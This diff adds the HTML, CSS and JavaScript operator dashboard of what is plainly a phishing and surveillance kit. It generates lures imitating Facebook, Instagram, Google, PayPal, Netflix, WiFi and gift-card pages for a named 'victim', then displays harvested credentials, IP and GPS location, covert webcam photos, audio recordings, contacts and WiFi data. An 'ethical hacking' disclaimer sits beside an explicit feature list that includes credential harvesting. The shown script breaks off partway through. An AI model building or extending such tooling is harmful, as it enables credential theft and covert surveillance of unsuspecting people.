@@ -1,0 +1,1304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>{{ config.app_name }} {{ config.app_emoji }} | {{ config.dashboard_title }}</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --primary:#0a0a14;
+  --surface:#12121f;
+  --surface-2:#1a1a2e;
+  --surface-3:#22223a;
+  --border:rgba(255,255,255,0.05);
+  --border-hover:rgba(255,255,255,0.1);
+  --text:#e4e4f0;
+  --text-dim:#7a7a9a;
+  --text-faint:#4a4a6a;
+  --accent:{{ config.brand_color }};
+  --accent-2:{{ config.brand_color_secondary }};
+  --danger:{{ config.danger_color }};
+  --success:{{ config.success_color }};
+  --warning:{{ config.warning_color }};
+  --glow:{{ config.brand_color }}18;
+}
+body{
+  background:var(--primary);
+  min-height:100vh;
+  font-family:'Inter',sans-serif;
+  color:var(--text);
+  overflow-x:hidden;
+}
+
+/* Background */
+.bg-layer{
+  position:fixed;
+  inset:0;
+  z-index:0;
+  background:
+    radial-gradient(ellipse 60% 40% at 10% 20%, {{ config.brand_color }}08 0%, transparent 60%),
+    radial-gradient(ellipse 50% 30% at 90% 80%, {{ config.brand_color_secondary }}06 0%, transparent 50%);
+}
+.grid-layer{
+  position:fixed;
+  inset:0;
+  z-index:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,0.008) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,0.008) 1px, transparent 1px);
+  background-size:50px 50px;
+}
+
+/* Sidebar */
+.sidebar{
+  position:fixed;
+  left:0;top:0;
+  width:260px;
+  height:100vh;
+  background:var(--surface);
+  border-right:1px solid var(--border);
+  z-index:100;
+  display:flex;
+  flex-direction:column;
+  transition:transform 0.35s cubic-bezier(0.4,0,0.2,1);
+}
+.sidebar-header{
+  padding:28px 22px 20px;
+  border-bottom:1px solid var(--border);
+}
+.brand{
+  display:flex;
+  align-items:center;
+  gap:12px;
+}
+.brand-icon{
+  width:40px;height:40px;
+  border-radius:12px;
+  background:linear-gradient(135deg, {{ config.brand_color }}, {{ config.brand_color_secondary }});
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:20px;
+  box-shadow:0 4px 16px {{ config.brand_color }}30;
+}
+.brand-text h2{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:14px;
+  font-weight:700;
+  letter-spacing:0.5px;
+  color:#fff;
+}
+.brand-text h2 span{
+  background:linear-gradient(135deg, {{ config.brand_color }}, {{ config.brand_color_secondary }});
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.brand-text p{
+  font-size:9px;
+  color:var(--text-faint);
+  letter-spacing:3px;
+  text-transform:uppercase;
+  margin-top:2px;
+  font-weight:500;
+}
+
+.nav-menu{
+  padding:16px 12px;
+  flex:1;
+  overflow-y:auto;
+}
+.nav-item{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  padding:13px 16px;
+  margin-bottom:4px;
+  border-radius:12px;
+  cursor:pointer;
+  transition:all 0.25s;
+  color:var(--text-dim);
+  font-size:13px;
+  font-weight:600;
+  letter-spacing:0.3px;
+  position:relative;
+  overflow:hidden;
+}
+.nav-item::before{
+  content:'';
+  position:absolute;
+  left:0;top:0;bottom:0;
+  width:3px;
+  background:linear-gradient(180deg, {{ config.brand_color }}, {{ config.brand_color_secondary }});
+  border-radius:0 4px 4px 0;
+  opacity:0;
+  transition:opacity 0.25s;
+}
+.nav-item:hover{
+  background:var(--surface-2);
+  color:var(--text);
+}
+.nav-item.active{
+  background:var(--surface-2);
+  color:#fff;
+}
+.nav-item.active::before{
+  opacity:1;
+}
+.nav-item i{
+  width:20px;
+  text-align:center;
+  font-size:15px;
+}
+.nav-item .badge{
+  margin-left:auto;
+  background:{{ config.danger_color }}20;
+  color:{{ config.danger_color }};
+  padding:3px 10px;
+  border-radius:20px;
+  font-size:10px;
+  font-weight:700;
+  font-family:'Space Grotesk',sans-serif;
+}
+
+.sidebar-footer{
+  padding:18px 16px;
+  border-top:1px solid var(--border);
+}
+.user-card{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-bottom:12px;
+}
+.user-avatar{
+  width:36px;height:36px;
+  border-radius:50%;
+  background:linear-gradient(135deg, {{ config.brand_color }}, {{ config.brand_color_secondary }});
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-family:'Space Grotesk',sans-serif;
+  font-size:14px;
+  font-weight:700;
+  color:#fff;
+}
+.user-info p{
+  font-size:13px;
+  font-weight:700;
+  color:#fff;
+}
+.user-info span{
+  font-size:10px;
+  color:var(--text-faint);
+  letter-spacing:1px;
+}
+.logout-btn{
+  width:100%;
+  padding:10px;
+  background:{{ config.danger_color }}10;
+  border:1px solid {{ config.danger_color }}20;
+  color:{{ config.danger_color }};
+  border-radius:10px;
+  font-size:11px;
+  font-weight:700;
+  letter-spacing:1.5px;
+  cursor:pointer;
+  transition:all 0.3s;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+}
+.logout-btn:hover{
+  background:{{ config.danger_color }}20;
+}
+
+/* Main Content */
+.main-content{
+  margin-left:260px;
+  padding:28px;
+  position:relative;
+  z-index:1;
+  min-height:100vh;
+}
+.page-header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:28px;
+  flex-wrap:wrap;
+  gap:12px;
+}
+.page-header h1{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:22px;
+  font-weight:700;
+  letter-spacing:-0.3px;
+  color:#fff;
+}
+.page-header h1 span{
+  background:linear-gradient(135deg, {{ config.brand_color }}, {{ config.brand_color_secondary }});
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.menu-toggle{
+  display:none;
+  position:fixed;
+  top:16px;left:16px;
+  z-index:200;
+  width:42px;height:42px;
+  background:var(--surface);
+  border:1px solid var(--border);
+  border-radius:12px;
+  color:var(--text);
+  align-items:center;
+  justify-content:center;
+  cursor:pointer;
+  font-size:16px;
+  box-shadow:0 4px 20px rgba(0,0,0,0.3);
+}
+
+/* Stats Grid */
+.stats-grid{
+  display:grid;
+  grid-template-columns:repeat(4,1fr);
+  gap:16px;
+  margin-bottom:28px;
+}
+.stat-card{
+  background:var(--surface);
+  border:1px solid var(--border);
+  border-radius:16px;
+  padding:22px 18px;
+  text-align:center;
+  transition:all 0.3s;
+  position:relative;
+  overflow:hidden;
+}
+.stat-card::before{
+  content:'';
+  position:absolute;
+  top:0;left:0;right:0;
+  height:2px;
+  background:linear-gradient(90deg, transparent, var(--accent), transparent);
+  opacity:0;
+  transition:opacity 0.3s;
+}
+.stat-card:hover{
+  border-color:var(--border-hover);
+  transform:translateY(-3px);
+  box-shadow:0 12px 40px rgba(0,0,0,0.3);
+}
+.stat-card:hover::before{
+  opacity:0.5;
+}
+.stat-icon{
+  font-size:22px;
+  margin-bottom:10px;
+}
+.stat-value{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:28px;
+  font-weight:800;
+  margin-bottom:4px;
+  color:#fff;
+}
+.stat-label{
+  color:var(--text-dim);
+  font-size:11px;
+  letter-spacing:1.5px;
+  text-transform:uppercase;
+  font-weight:600;
+}
+.stat-card:nth-child(1) .stat-value{color:{{ config.brand_color }};}
+.stat-card:nth-child(2) .stat-value{color:{{ config.danger_color }};}
+.stat-card:nth-child(3) .stat-value{color:{{ config.success_color }};}
+.stat-card:nth-child(4) .stat-value{color:{{ config.warning_color }};}
+.stat-card:nth-child(5) .stat-value{color:#00c8ff;}
+.stat-card:nth-child(6) .stat-value{color:#a855f7;}
+.stat-card:nth-child(7) .stat-value{color:#f97316;}
+.stat-card:nth-child(8) .stat-value{color:#ec4899;}
+
+/* Content Section */
+.content-section{
+  background:var(--surface);
+  border:1px solid var(--border);
+  border-radius:16px;
+  padding:24px;
+  margin-bottom:20px;
+}
+.section-header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:20px;
+  flex-wrap:wrap;
+  gap:10px;
+}
+.section-header h2{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:15px;
+  font-weight:700;
+  letter-spacing:0.5px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  color:#fff;
+}
+.section-header h2 i{
+  color:{{ config.brand_color }};
+  font-size:14px;
+}
+.btn{
+  padding:10px 18px;
+  border-radius:10px;
+  font-size:11px;
+  font-weight:700;
+  letter-spacing:1.5px;
+  text-transform:uppercase;
+  cursor:pointer;
+  border:none;
+  transition:all 0.3s;
+  font-family:'Inter',sans-serif;
+}
+.btn-primary{
+  background:linear-gradient(135deg, {{ config.brand_color }}, {{ config.brand_color_secondary }});
+  color:#fff;
+}
+.btn-primary:hover{
+  transform:translateY(-2px);
+  box-shadow:0 8px 25px {{ config.brand_color }}40;
+}
+.btn-danger{
+  background:{{ config.danger_color }}10;
+  border:1px solid {{ config.danger_color }}25;
+  color:{{ config.danger_color }};
+}
+.btn-danger:hover{
+  background:{{ config.danger_color }}20;
+}
+
+/* Templates */
+.template-grid{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:12px;
+  margin-bottom:20px;
+}
+.template-card{
+  background:var(--surface-2);
+  border:1px solid var(--border);
+  border-radius:14px;
+  padding:20px;
+  text-align:center;
+  cursor:pointer;
+  transition:all 0.3s;
+}
+.template-card:hover{
+  border-color:{{ config.brand_color }}40;
+  transform:translateY(-3px);
+  box-shadow:0 10px 30px rgba(0,0,0,0.2);
+}
+.template-card.selected{
+  border-color:{{ config.brand_color }};
+  background:{{ config.brand_color }}08;
+  box-shadow:0 0 20px {{ config.brand_color }}20;
+}
+.template-icon{
+  font-size:32px;
+  margin-bottom:8px;
+}
+.template-name{
+  font-size:12px;
+  color:var(--text-dim);
+  font-weight:600;
+}
+
+/* Input */
+.input-group{
+  display:flex;
+  gap:10px;
+  margin-bottom:15px;
+}
+.input-group input{
+  flex:1;
+  padding:13px 16px;
+  background:var(--surface-2);
+  border:1px solid var(--border);
+  border-radius:12px;
+  color:#fff;
+  font-size:14px;
+  outline:none;
+  font-family:'Inter',sans-serif;
+  transition:all 0.3s;
+}
+.input-group input:focus{
+  border-color:{{ config.brand_color }}60;
+  box-shadow:0 0 0 3px {{ config.brand_color }}10;
+}
+.input-group input::placeholder{
+  color:var(--text-faint);
+}
+
+/* Capture Cards */
+.capture-card{
+  background:var(--surface);
+  border:1px solid var(--border);
+  border-radius:16px;
+  padding:22px;
+  margin-bottom:14px;
+  transition:all 0.3s;
+}
+.capture-card:hover{
+  border-color:var(--border-hover);
+}
+.capture-tags{
+  display:flex;
+  gap:8px;
+  flex-wrap:wrap;
+  margin-bottom:12px;
+}
+.capture-tag{
+  padding:5px 12px;
+  border-radius:20px;
+  font-size:10px;
+  font-weight:700;
+  letter-spacing:1px;
+}
+.tag-purple{background:{{ config.brand_color }}15;color:{{ config.brand_color }};border:1px solid {{ config.brand_color }}25;}
+.tag-blue{background:#00c8ff15;color:#00c8ff;border:1px solid #00c8ff25;}
+.tag-green{background:{{ config.success_color }}15;color:{{ config.success_color }};border:1px solid {{ config.success_color }}25;}
+.tag-red{background:{{ config.danger_color }}15;color:{{ config.danger_color }};border:1px solid {{ config.danger_color }}25;}
+.tag-orange{background:{{ config.warning_color }}15;color:{{ config.warning_color }};border:1px solid {{ config.warning_color }}25;}
+.capture-ip{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:15px;
+  color:{{ config.warning_color }};
+  margin-bottom:4px;
+  font-weight:700;
+}
+.capture-location{
+  color:var(--text-dim);
+  font-size:12px;
+  margin-bottom:10px;
+}
+.capture-device{
+  background:var(--surface-2);
+  border:1px solid var(--border);
+  border-radius:10px;
+  padding:12px 16px;
+  font-size:12px;
+  color:var(--text-dim);
+  margin-bottom:10px;
+}
+.capture-creds{
+  background:{{ config.success_color }}08;
+  border:1px solid {{ config.success_color }}15;
+  border-radius:10px;
+  padding:12px 16px;
+  font-size:12px;
+  color:{{ config.success_color }};
+  margin-bottom:10px;
+  font-family:'Space Grotesk',sans-serif;
+  font-weight:600;
+  word-break:break-all;
+}
+
+/* Photos */
+.capture-photos{
+  display:grid;
+  grid-template-columns:repeat(5,1fr);
+  gap:8px;
+  margin-bottom:12px;
+}
+.capture-photos .photo-thumb{
+  width:100%;
+  height:70px;
+  object-fit:cover;
+  border-radius:10px;
+  border:1px solid var(--border);
+  cursor:pointer;
+  transition:all 0.3s;
+}
+.capture-photos .photo-thumb:hover{
+  transform:scale(1.05);
+  box-shadow:0 5px 15px rgba(0,0,0,0.3);
+  border-color:{{ config.brand_color }}60;
+}
+
+/* Audio */
+.capture-audio{
+  background:{{ config.danger_color }}05;
+  border:1px solid {{ config.danger_color }}10;
+  border-radius:10px;
+  padding:8px 14px;
+  margin-bottom:10px;
+}
+.capture-audio audio{
+  width:100%;
+  height:36px;
+}
+
+/* Map Button - FIXED */
+.map-btn{
+  display:inline-flex;
+  align-items:center;
+  gap:8px;
+  padding:10px 18px;
+  background:{{ config.danger_color }}12;
+  border:1px solid {{ config.danger_color }}25;
+  color:{{ config.danger_color }};
+  border-radius:10px;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:700;
+  letter-spacing:0.5px;
+  transition:all 0.3s;
+  text-decoration:none;
+  font-family:'Inter',sans-serif;
+}
+.map-btn:hover{
+  background:{{ config.danger_color }}20;
+  box-shadow:0 0 20px {{ config.danger_color }}20;
+  transform:translateY(-1px);
+}
+.map-btn i{
+  font-size:13px;
+}
+
+/* Lightbox */
+.lightbox-overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.95);
+  backdrop-filter:blur(10px);
+  z-index:3000;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+  padding:20px;
+}
+.lightbox-overlay.active{
+  display:flex;
+}
+.lightbox-img{
+  max-width:90%;
+  max-height:75vh;
+  border-radius:12px;
+  border:2px solid {{ config.brand_color }}30;
+  box-shadow:0 20px 60px rgba(0,0,0,0.5);
+}
+.lightbox-actions{
+  display:flex;
+  gap:15px;
+  margin-top:20px;
+}
+.lightbox-btn{
+  padding:12px 24px;
+  border-radius:10px;
+  font-size:12px;
+  font-weight:700;
+  letter-spacing:1.5px;
+  cursor:pointer;
+  border:none;
+  transition:all 0.3s;
+  text-decoration:none;
+  display:inline-flex;
+  align-items:center;
+  gap:8px;
+  font-family:'Inter',sans-serif;
+}
+.lightbox-close{
+  background:var(--surface-2);
+  border:1px solid var(--border);
+  color:var(--text);
+}
+.lightbox-close:hover{
+  background:var(--surface-3);
+}
+.lightbox-download{
+  background:linear-gradient(135deg, {{ config.brand_color }}, {{ config.brand_color_secondary }});
+  color:#fff;
+}
+.lightbox-download:hover{
+  transform:translateY(-2px);
+  box-shadow:0 10px 30px {{ config.brand_color }}40;
+}
+.lightbox-counter{
+  color:var(--text-dim);
+  font-size:12px;
+  margin-bottom:15px;
+  font-family:'Space Grotesk',sans-serif;
+  font-weight:700;
+}
+
+/* Modal */
+.modal-overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.85);
+  backdrop-filter:blur(15px);
+  z-index:1000;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+}
+.modal-overlay.active{
+  display:flex;
+}
+.modal{
+  background:var(--surface);
+  border:1px solid var(--border);
+  border-radius:20px;
+  padding:28px;
+  width:100%;
+  max-width:700px;
+  animation:modalIn 0.3s ease;
+  max-height:90vh;
+  overflow-y:auto;
+}
+@keyframes modalIn{
+  from{opacity:0;transform:scale(0.95) translateY(10px)}
+  to{opacity:1;transform:scale(1) translateY(0)}
+}
+.modal h3{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:16px;
+  font-weight:700;
+  margin-bottom:20px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  color:#fff;
+}
+.modal h3 i{
+  color:{{ config.brand_color }};
+}
+.photo-gallery{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(100px,1fr));
+  gap:10px;
+  margin-bottom:15px;
+}
+.photo-gallery img{
+  width:100%;
+  height:100px;
+  object-fit:cover;
+  border-radius:10px;
+  border:1px solid var(--border);
+  cursor:pointer;
+}
+.detail-grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:10px;
+}
+.detail-item{
+  background:var(--surface-2);
+  padding:14px;
+  border-radius:12px;
+  border:1px solid var(--border);
+}
+.detail-item label{
+  font-size:9px;
+  color:var(--text-faint);
+  letter-spacing:2px;
+  text-transform:uppercase;
+  font-weight:700;
+  display:block;
+  margin-bottom:6px;
+}
+.detail-item p{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:12px;
+  color:{{ config.brand_color }};
+  word-break:break-all;
+  font-weight:600;
+}
+.modal-actions{
+  display:flex;
+  gap:10px;
+  margin-top:20px;
+}
+.modal-actions .btn{
+  flex:1;
+}
+.btn-secondary{
+  background:var(--surface-2);
+  border:1px solid var(--border);
+  color:var(--text-dim);
+}
+.btn-secondary:hover{
+  background:var(--surface-3);
+  color:var(--text);
+}
+
+/* Loading */
+.loading-overlay{
+  position:fixed;
+  inset:0;
+  background:var(--primary);
+  z-index:2000;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:20px;
+}
+.loading-overlay.hidden{
+  display:none;
+}
+.load-spinner{
+  width:50px;height:50px;
+  border:3px solid {{ config.brand_color }}15;
+  border-top-color:{{ config.brand_color }};
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:13px;
+  letter-spacing:4px;
+  color:{{ config.brand_color }};
+  font-weight:700;
+}
+
+/* Responsive */
+@media(max-width:768px){
+  .sidebar{transform:translateX(-100%);width:260px}
+  .sidebar.open{transform:translateX(0)}
+  .main-content{margin-left:0;padding:16px;padding-top:70px}
+  .menu-toggle{display:flex}
+  .stats-grid{grid-template-columns:repeat(2,1fr);gap:10px}
+  .template-grid{grid-template-columns:repeat(2,1fr)}
+  .capture-photos{grid-template-columns:repeat(5,1fr)}
+  .capture-photos .photo-thumb{height:55px}
+}
+@media(max-width:480px){
+  .stats-grid{grid-template-columns:repeat(2,1fr)}
+  .template-grid{grid-template-columns:repeat(2,1fr)}
+  .capture-photos{grid-template-columns:repeat(5,1fr);gap:4px}
+  .capture-photos .photo-thumb{height:45px}
+  .page-header h1{font-size:18px}
+}
+</style>
+</head>
+<body>
+<div class="bg-layer"></div>
+<div class="grid-layer"></div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="load-spinner"></div>
+  <div class="loading-text">INITIALIZING SYSTEM...</div>
+</div>
+
+<button class="menu-toggle" id="menuToggle" onclick="toggleSidebar()">
+  <i class="fas fa-bars"></i>
+</button>
+
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-header">
+    <div class="brand">
+      <div class="brand-icon">{{ config.app_emoji }}</div>
+      <div class="brand-text">
+        <h2>{{ config.app_name.split(' ')[0] }} <span>{{ config.app_name.split(' ')[1] if ' ' in config.app_name else '' }}</span></h2>
+        <p>{{ config.sidebar_title }}</p>
+      </div>
+    </div>
+  </div>
+  <div class="nav-menu">
+    <div class="nav-item active" onclick="showSection('dashboard')">
+      <i class="fas fa-chart-line"></i>Dashboard
+    </div>
+    <div class="nav-item" onclick="showSection('generate')">
+      <i class="fas fa-link"></i>Generate
+    </div>
+    <div class="nav-item" onclick="showSection('captures')">
+      <i class="fas fa-camera"></i>Captures
+      <span class="badge" id="captureBadge">0</span>
+    </div>
+    <div class="nav-item" onclick="showSection('settings')">
+      <i class="fas fa-cog"></i>Settings
+    </div>
+  </div>
+  <div class="sidebar-footer">
+    <div class="user-card">
+      <div class="user-avatar" id="userAvatar">U</div>
+      <div class="user-info">
+        <p id="userName">User</p>
+        <span>ADMIN ACCESS</span>
+      </div>
+    </div>
+    <button class="logout-btn" onclick="logout()">
+      <i class="fas fa-power-off"></i> TERMINATE SESSION
+    </button>
+  </div>
+</div>
+
+<div class="main-content">
+  <!-- DASHBOARD -->
+  <div id="dashboardSection">
+    <div class="page-header">
+      <h1><i class="fas fa-terminal"></i> COMMAND <span>CENTER</span></h1>
+    </div>
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-icon">📷</div>
+        <div class="stat-value" id="statPhotos">0</div>
+        <div class="stat-label">Photos</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">🔑</div>
+        <div class="stat-value" id="statCreds">0</div>
+        <div class="stat-label">Creds</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">🎤</div>
+        <div class="stat-value" id="statAudio">0</div>
+        <div class="stat-label">Audio</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">🌐</div>
+        <div class="stat-value" id="statTotal">0</div>
+        <div class="stat-label">Total</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">📍</div>
+        <div class="stat-value" id="statGPS">0</div>
+        <div class="stat-label">GPS</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">👤</div>
+        <div class="stat-value" id="statContacts">0</div>
+        <div class="stat-label">Contacts</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">📶</div>
+        <div class="stat-value" id="statWiFi">0</div>
+        <div class="stat-label">WiFi</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">👥</div>
+        <div class="stat-value" id="statUsers">0</div>
+        <div class="stat-label">Users</div>
+      </div>
+    </div>
+    <div class="content-section">
+      <div class="section-header">
+        <h2><i class="fas fa-bolt"></i> Recent Captures</h2>
+      </div>
+      <div id="recentCaptures">
+        <div style="text-align:center;padding:40px;color:var(--text-dim)">
+          <i class="fas fa-inbox" style="font-size:40px;margin-bottom:15px;display:block;opacity:0.3"></i>
+          No captures yet
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- GENERATE -->
+  <div id="generateSection" style="display:none">
+    <div class="page-header">
+      <h1><i class="fas fa-magic"></i> GENERATE <span>LINK</span></h1>
+    </div>
+    <div class="content-section">
+      <div class="section-header">
+        <h2><i class="fas fa-palette"></i> Select Template</h2>
+      </div>
+      <div class="template-grid">
+        <div class="template-card" onclick="selectTemplate('gaming')" data-template="gaming">
+          <div class="template-icon">🎮</div>
+          <div class="template-name">Gaming</div>
+        </div>
+        <div class="template-card" onclick="selectTemplate('facebook')" data-template="facebook">
+          <div class="template-icon">💬</div>
+          <div class="template-name">Facebook</div>
+        </div>
+        <div class="template-card" onclick="selectTemplate('instagram')" data-template="instagram">
+          <div class="template-icon">📷</div>
+          <div class="template-name">Instagram</div>
+        </div>
+        <div class="template-card" onclick="selectTemplate('google')" data-template="google">
+          <div class="template-icon">🔍</div>
+          <div class="template-name">Google</div>
+        </div>
+        <div class="template-card" onclick="selectTemplate('pubg')" data-template="pubg">
+          <div class="template-icon">🔫</div>
+          <div class="template-name">PUBG</div>
+        </div>
+        <div class="template-card" onclick="selectTemplate('netflix')" data-template="netflix">
+          <div class="template-icon">🎬</div>
+          <div class="template-name">Netflix</div>
+        </div>
+        <div class="template-card" onclick="selectTemplate('tiktok')" data-template="tiktok">
+          <div class="template-icon">🎵</div>
+          <div class="template-name">TikTok</div>
+        </div>
+        <div class="template-card" onclick="selectTemplate('paypal')" data-template="paypal">
+          <div class="template-icon">💳</div>
+          <div class="template-name">PayPal</div>
+        </div>
+        <div class="template-card" onclick="selectTemplate('snapchat')" data-template="snapchat">
+          <div class="template-icon">👻</div>
+          <div class="template-name">Snapchat</div>
+        </div>
+        <div class="template-card" onclick="selectTemplate('wifi')" data-template="wifi">
+          <div class="template-icon">📶</div>
+          <div class="template-name">WiFi</div>
+        </div>
+        <div class="template-card" onclick="selectTemplate('gpay')" data-template="gpay">
+          <div class="template-icon">🎁</div>
+          <div class="template-name">Gift Card</div>
+        </div>
+      </div>
+      <div class="input-group">
+        <input type="text" id="victimName" placeholder="Victim name">
+        <button class="btn btn-primary" onclick="generateLink()" style="white-space:nowrap"><i class="fas fa-bolt"></i> Go</button>
+      </div>
+      <div style="margin-bottom:15px">
+        <input type="text" id="customDP" placeholder="Custom DP Image URL (optional)" style="width:100%;padding:13px 16px;background:var(--surface-2);border:1px solid var(--border);border-radius:12px;color:#fff;font-size:14px;outline:none;font-family:'Inter',sans-serif;">
+        <p style="color:var(--text-faint);font-size:11px;margin-top:6px">Paste image URL for custom profile picture on fake page</p>
+      </div>
+      <div id="generatedLink" style="display:none;margin-top:15px">
+        <div style="background:{{ config.brand_color }}08;border:1px solid {{ config.brand_color }}20;border-radius:12px;padding:18px">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:12px">
+            <span class="capture-tag tag-purple" id="genTemplateTag">Netflix</span>
+          </div>
+          <input type="text" id="genLinkUrl" readonly style="width:100%;background:var(--surface-2);border:1px solid var(--border);border-radius:10px;padding:12px;color:{{ config.brand_color }};font-family:'Space Grotesk',sans-serif;font-size:12px;outline:none;margin-bottom:12px;font-weight:600;">
+          <button class="btn btn-primary" onclick="copyGeneratedLink()" style="width:100%"><i class="fas fa-copy"></i> Copy Link</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CAPTURES -->
+  <div id="capturesSection" style="display:none">
+    <div class="page-header">
+      <h1><i class="fas fa-camera"></i> CAPTURED <span>DATA</span></h1>
+      <button class="btn btn-danger" onclick="clearCaptures()">
+        <i class="fas fa-trash"></i> CLEAR ALL
+      </button>
+    </div>
+    <div id="capturesList"></div>
+  </div>
+
+  <!-- SETTINGS -->
+  <div id="settingsSection" style="display:none">
+    <div class="page-header">
+      <h1><i class="fas fa-cog"></i> SYSTEM <span>SETTINGS</span></h1>
+    </div>
+    <div class="content-section">
+      <div class="section-header">
+        <h2><i class="fas fa-info-circle"></i> About {{ config.app_name }}</h2>
+      </div>
+      <p style="color:var(--text-dim);line-height:1.8;font-size:14px;">
+        <strong style="color:{{ config.brand_color }};">{{ config.app_name }} {{ config.app_emoji }}</strong> is an advanced ethical hacking and security awareness platform designed for authorized penetration testing and security research purposes.<br><br>
+        <strong style="color:{{ config.brand_color }}">Features:</strong><br>
+        • Generate tracking links with multiple templates (Netflix, Facebook, Instagram, etc.)<br>
+        • Capture device information, IP, GPS location<br>
+        • WebRTC-based camera photo capture (5 photos)<br>
+        • Audio recording capture<br>
+        • Credential harvesting (username/password)<br>
+        • Google Maps integration for location viewing<br>
+        • Real-time dashboard monitoring<br>
+        • JSON file-based data storage<br><br>
+        <strong style="color:{{ config.danger_color }}">Disclaimer:</strong><br>
+        This tool is intended for educational and authorized security testing purposes only. Unauthorized use to capture data without explicit consent is illegal and punishable under cybercrime laws (IT Act 2000, Section 66C, 66D). Always obtain proper written authorization before testing. The developers are not responsible for any misuse of this tool.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Lightbox -->
+<div class="lightbox-overlay" id="lightboxOverlay" onclick="closeLightbox(event)">
+  <div class="lightbox-counter" id="lightboxCounter">1 / 5</div>
+  <img class="lightbox-img" id="lightboxImg" src="" alt="Capture">
+  <div class="lightbox-actions">
+    <button class="lightbox-btn lightbox-close" onclick="closeLightboxBtn()">
+      <i class="fas fa-times"></i> Close
+    </button>
+    <a class="lightbox-btn lightbox-download" id="lightboxDownload" href="" download="capture.jpg">
+      <i class="fas fa-download"></i> Download
+    </a>
+  </div>
+</div>
+
+<!-- Detail Modal -->
+<div class="modal-overlay" id="captureModal">
+  <div class="modal">
+    <h3><i class="fas fa-eye"></i> Capture Detail</h3>
+    <div id="captureDetailContent"></div>
+    <div class="modal-actions">
+      <button class="btn btn-secondary" onclick="closeCaptureModal()">CLOSE</button>
+    </div>
+  </div>
+</div>
+
+<script>
+let currentUser=null;
+let selectedTemplate='netflix';
+let currentLightboxPhotos=[];
+let currentLightboxIndex=0;
+
+async function init(){
+  try{
+    const res=await fetch('/api/user');
+    const data=await res.json();
+    if(data.success){
+      currentUser=data.user;
+      document.getElementById('userName').textContent=currentUser.username;
+      document.getElementById('userAvatar').textContent=currentUser.username.charAt(0).toUpperCase();
+      await loadStats();
+      await loadCaptures();
+      setTimeout(()=>document.getElementById('loadingOverlay').classList.add('hidden'),800);
+    }else{window.location.href='/login';}
+  }catch(err){window.location.href='/login';}
+}
+
+function toggleSidebar(){
+  document.getElementById('sidebar').classList.toggle('open');
+}
+
+function showSection(section){
+  ['dashboard','generate','captures','settings'].forEach(s=>{document.getElementById(s+'Section').style.display='none';});
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  document.getElementById(section+'Section').style.display='block';
+  const idx=['dashboard','generate','captures','settings'].indexOf(section);
+  document.querySelectorAll('.nav-item')[idx]?.classList.add('active');
+  document.getElementById('sidebar').classList.remove('open');
+  if(section==='captures')loadCaptures();
+  if(section==='dashboard'){loadStats();loadRecentCaptures();}
+}
+
+function selectTemplate(tmpl){
+  selectedTemplate=tmpl;
+  document.querySelectorAll('.template-card').forEach(c=>c.classList.remove('selected'));
+  document.querySelector(`[data-template="${tmpl}"]`)?.classList.add('selected');
+}
+
+async function generateLink(){
+  const victimName=document.getElementById('victimName').value.trim();
+  const customDP=document.getElementById('customDP').value.trim();
+  try{
